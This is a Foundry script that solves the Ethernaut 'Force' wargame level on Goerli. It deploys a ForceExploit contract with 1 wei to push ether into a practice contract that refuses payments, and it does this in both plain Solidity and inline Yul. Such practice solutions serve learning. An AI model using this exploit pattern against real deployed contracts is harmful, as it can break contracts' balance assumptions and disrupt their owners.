// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

import { ForceExploit } from "../../contracts/7_Force.sol";

interface Instance {}

contract ForceScript is EthernautScript {
    string network = "goerli";
    address level = 0x46f79002907a025599f355A04A512A6Fd45E671B;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        ForceExploit force = new ForceExploit{ value: 1 }(payable(address(instance)));
        force.exploit();
        require(address(force).balance == 0);
        require(address(instance).balance == 1);
    }

    function yulVersion() internal {
        bytes memory initCode = type(ForceExploit).creationCode;

        assembly {
            let size := mload(initCode)
            let offsetArg := add(add(initCode, 0x20), size)
            mstore(initCode, add(size, 0x20))
            mstore(offsetArg, sload(instance.slot))

            let force := create(1, add(initCode, 0x20), mload(initCode))
            if iszero(force) {
                revert(0, 0)
            }

            mstore(0, "exploit()")
            mstore(0, keccak256(0, 9))
            let success := call(gas(), force, 0, 0, 4, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            if iszero(eq(balance(force), 0)) {
                revert(0, 0)
            }
            if iszero(eq(balance(sload(instance.slot)), 1)) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
